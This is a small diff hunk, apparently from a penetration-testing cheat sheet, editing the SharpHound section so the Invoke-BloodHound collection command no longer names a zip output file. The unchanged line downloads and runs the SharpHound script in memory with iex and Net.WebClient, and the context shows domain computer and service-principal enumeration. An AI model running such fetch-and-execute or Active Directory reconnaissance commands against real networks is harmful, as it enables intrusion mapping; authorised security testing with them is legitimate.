@@ -673,7 +673,7 @@ Get-NetComputer | Select-Object Name, ServicePrincipalName
 ## 6.3 SharpHound
 ```
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1')
-Invoke-BloodHound -CollectionMethod All -Domain yourdomain.local -ZipFileName C:\Users\Public\BloodHound.zip
+Invoke-BloodHound -CollectionMethod All -Domain yourdomain.local
 
 ```
 
